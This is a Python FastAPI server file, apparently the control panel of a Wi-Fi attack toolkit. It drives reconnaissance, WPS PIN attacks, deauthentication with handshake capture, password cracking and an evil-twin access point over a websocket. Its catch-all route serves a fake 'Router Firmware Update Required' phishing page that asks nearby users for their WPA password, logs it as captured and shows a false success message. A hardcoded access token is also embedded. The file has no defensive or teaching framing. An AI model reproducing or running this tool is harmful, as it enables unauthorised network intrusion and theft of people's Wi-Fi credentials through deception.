from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, Query
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from contextlib import asynccontextmanager
import uvicorn
import asyncio
import os
import json
import subprocess
import re

from core.recon import ReconEngine, TargetScanner
from core.attacks.wps_attack import WPSAttackEngine
from core.attacks.handshake import HandshakeCaptureEngine
from core.attacks.cracker import CrackerEngine
from core.attacks.evil_twin import EvilTwinEngine

ACCESS_TOKEN = "V$j(Vqm,}XF,9i_|HZtL"

@asynccontextmanager
async def lifespan(app: FastAPI):
    app.state.loop = asyncio.get_running_loop()
    app.state.engine_lock = asyncio.Lock()
    yield

app = FastAPI(lifespan=lifespan)
app.mount("/static", StaticFiles(directory="static"), name="static")

class ConnectionManager:
    def __init__(self):
        self.active_connections = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except Exception:
                pass

manager = ConnectionManager()

def on_log_callback(message, loop):
    if loop and loop.is_running():
        asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "log", "message": message}), loop)

def on_update_callback(db, loop, networks_db):
    networks_db.update(db)
    if loop and loop.is_running():
        asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "targets", "data": list(networks_db.values())}), loop)

def on_station_callback(stations, loop):
    if loop and loop.is_running():
        asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "stations", "data": stations}), loop)

def on_success_callback(event_type, key_type, value, loop):
    if loop and loop.is_running():
        asyncio.run_coroutine_threadsafe(manager.broadcast({"type": event_type, "key_type": key_type, "value": value}), loop)

def get_interfaces():
    try:
        result = subprocess.run(["iw", "dev"], capture_output=True, text=True)
        interfaces = re.findall(r"Interface\s+(\w+)", result.stdout)
        return interfaces if interfaces else ["wlan0"]
    except Exception:
        return ["wlan0"]

@app.get("/api/interfaces")
async def api_interfaces():
    return {"interfaces": get_interfaces()}

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, token: str = Query(...)):
    if token != ACCESS_TOKEN:
        await websocket.close(code=1008)
        return

    await manager.connect(websocket)
    loop = app.state.loop
    
    recon_engine = None
    target_scanner = None
    wps_engine = None
    handshake_engine = None
    cracker_engine = None
    evil_twin_engine = None
    networks_db = {}
    target_info = {}
    selected_interface = "wlan0"

    try:
        while True:
            data = await websocket.receive_text()
            try:
                msg = json.loads(data)
            except json.JSONDecodeError:
                continue

            action = msg.get("action")
            if not action:
                continue

            async with app.state.engine_lock:
                async def stop_all_engines():
                    nonlocal recon_engine, target_scanner, wps_engine, handshake_engine, cracker_engine, evil_twin_engine
                    if recon_engine: await asyncio.to_thread(recon_engine.stop); recon_engine = None
                    if target_scanner: await asyncio.to_thread(target_scanner.stop); target_scanner = None
                    if wps_engine: await asyncio.to_thread(wps_engine.stop); wps_engine = None
                    if handshake_engine: await asyncio.to_thread(handshake_engine.stop); handshake_engine = None
                    if cracker_engine: await asyncio.to_thread(cracker_engine.stop); cracker_engine = None
                    if evil_twin_engine: await asyncio.to_thread(evil_twin_engine.stop); evil_twin_engine = None

                if action == "set_interface":
                    iface = msg.get("interface")
                    if iface and iface != selected_interface:
                        await stop_all_engines()
                        selected_interface = iface
                        networks_db.clear()
                        target_info.clear()
                        asyncio.run_coroutine_threadsafe(manager.broadcast({"type": "clear_ui"}), loop)
                        on_log_callback(f"[*] Interface switched to {selected_interface}", loop)

                elif action == "start_recon":
                    if not recon_engine:
                        await stop_all_engines()
                        recon_engine = ReconEngine(selected_interface, lambda m: on_log_callback(m, loop), lambda db: on_update_callback(db, loop, networks_db))
                        recon_engine.start()

                elif action == "stop_recon":
                    if recon_engine:
                        await asyncio.to_thread(recon_engine.stop)
                        recon_engine = None

                elif action == "select_target":
                    bssid = msg.get("bssid")
                    if bssid in networks_db:
                        target = networks_db[bssid]
                        target_info.update(target)
                        await stop_all_engines()
                        target_scanner = TargetScanner(
                            selected_interface, target["bssid"], target["channel"], target["essid"],
                            lambda m: on_log_callback(m, loop), lambda s: on_station_callback(s, loop)
                        )
                        target_scanner.start()

                elif action == "back_to_scan":
                    await stop_all_engines()
                    on_log_callback("[*] Returning to general scan...", loop)
                    if not recon_engine:
                        recon_engine = ReconEngine(selected_interface, lambda m: on_log_callback(m, loop), lambda db: on_update_callback(db, loop, networks_db))
                        recon_engine.start()

                elif action == "start_wps":
                    mode = msg.get("mode", "pixie")
                    if wps_engine:
                        on_log_callback("[-] WPS attack is already running!", loop)
                        continue
                    await stop_all_engines()
                    wps_engine = WPSAttackEngine(
                        selected_interface, target_info["bssid"], target_info["channel"],
                        lambda m: on_log_callback(m, loop), lambda k, v: on_success_callback("wps_success", k, v, loop), mode=mode
                    )
                    wps_engine.start()

                elif action == "stop_wps":
                    if wps_engine: await asyncio.to_thread(wps_engine.stop); wps_engine = None

                elif action == "start_deauth":
                    client_mac = msg.get("client_mac")
                    if handshake_engine:
                        on_log_callback("[-] Handshake capture is already running!", loop)
                        continue
                    await stop_all_engines()
                    handshake_engine = HandshakeCaptureEngine(
                        selected_interface, target_info["bssid"], target_info["channel"], target_info["essid"],
                        client_mac, lambda m: on_log_callback(m, loop), lambda k, v: on_success_callback("hs_success", k, v, loop)
                    )
                    handshake_engine.start()

                elif action == "stop_handshake":
                    if handshake_engine: await asyncio.to_thread(handshake_engine.stop); handshake_engine = None

                elif action == "start_crack":
                    wordlist = msg.get("wordlist")
                    cap_file = msg.get("cap_file")
                    if cracker_engine:
                        on_log_callback("[-] Cracking is already running!", loop)
                        continue
                    cracker_engine = CrackerEngine(
                        cap_file, wordlist, lambda m: on_log_callback(m, loop), lambda k, v: on_success_callback("crack_success", k, v, loop)
                    )
                    cracker_engine.start()

                elif action == "stop_crack":
                    if cracker_engine: await asyncio.to_thread(cracker_engine.stop); cracker_engine = None

                elif action == "start_evil_twin":
                    if evil_twin_engine:
                        on_log_callback("[-] Evil Twin is already running!", loop)
                        continue
                    await stop_all_engines()
                    evil_twin_engine = EvilTwinEngine(
                        selected_interface, target_info["bssid"], target_info["essid"], target_info["channel"],
                        lambda m: on_log_callback(m, loop), lambda k, v: on_success_callback("et_success", k, v, loop)
                    )
                    evil_twin_engine.start()

                elif action == "stop_evil_twin":
                    if evil_twin_engine: await asyncio.to_thread(evil_twin_engine.stop); evil_twin_engine = None

    except WebSocketDisconnect:
        if recon_engine: await asyncio.to_thread(recon_engine.stop)
        if target_scanner: await asyncio.to_thread(target_scanner.stop)
        if wps_engine: await asyncio.to_thread(wps_engine.stop)
        if handshake_engine: await asyncio.to_thread(handshake_engine.stop)
        if cracker_engine: await asyncio.to_thread(cracker_engine.stop)
        if evil_twin_engine: await asyncio.to_thread(evil_twin_engine.stop)
        manager.disconnect(websocket)

@app.api_route("/{path:path}", methods=["GET", "POST"])
async def smart_router(request: Request, path: str):
    client_ip = request.client.host
    
    if client_ip in ["127.0.0.1", "::1"] or path.startswith("ws") or path.startswith("api"):
        if request.method == "GET":
            with open(os.path.join("static", "index.html"), "r") as f:
                return HTMLResponse(content=f.read())
        return JSONResponse({"error": "Method not allowed for UI"}, status_code=405)

    if request.method == "GET":
        html_content = """
        <html>
            <head><title>Router Login</title></head>
            <body style='font-family: sans-serif; text-align: center; margin-top: 50px; background-color: #f0f0f0;'>
                <div style='background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 400px; margin: auto;'>
                    <h2 style='color: #333;'>Router Firmware Update Required</h2>
                    <p style='color: #666; font-size: 14px;'>A critical security update is available. Please enter your WPA password to apply the update and restore internet access.</p>
                    <form action="/" method="post">
                        <input type="password" name="password" placeholder="Enter WPA Password" required style="padding: 10px; width: 80%; border: 1px solid #ccc; border-radius: 5px; margin-bottom: 15px;'>
                        <br>
                        <button type="submit" style="padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer;">Apply Update</button>
                    </form>
                </div>
            </body>
        </html>
        """
        return HTMLResponse(content=html_content)
        
    elif request.method == "POST":
        form = await request.form()
        password = form.get("password")
        loop = app.state.loop
        on_log_callback(f"[+] PASSWORD CAPTURED VIA PORTAL: {password}", loop)
        on_success_callback("et_success", "password", password, loop)
        
        success_html = """
        <html>
            <head><title>Update Successful</title></head>
            <body style='font-family: sans-serif; text-align: center; margin-top: 50px; background-color: #f0f0f0;'>
                <div style='background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 400px; margin: auto;'>
                    <h2 style='color: green;'>Update Successful!</h2>
                    <p style='color: #666; font-size: 14px;'>Your router is being updated. You will be disconnected shortly. Please reconnect in a few minutes.</p>
                </div>
            </body>
        </html>
        """
        return HTMLResponse(content=success_html)

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=False)